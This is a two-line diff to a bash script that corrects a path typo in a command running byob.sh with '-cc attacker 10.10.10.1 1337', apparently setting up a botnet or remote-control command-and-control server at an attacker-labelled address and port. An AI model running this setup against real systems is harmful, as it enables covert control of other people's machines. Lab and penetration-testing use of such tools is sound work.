@@ -1,4 +1,4 @@
 #!/bin/bash
 
-./instal/byob.sh -cc attacker 10.10.10.1 1337
+./install/byob.sh -cc attacker 10.10.10.1 1337
 
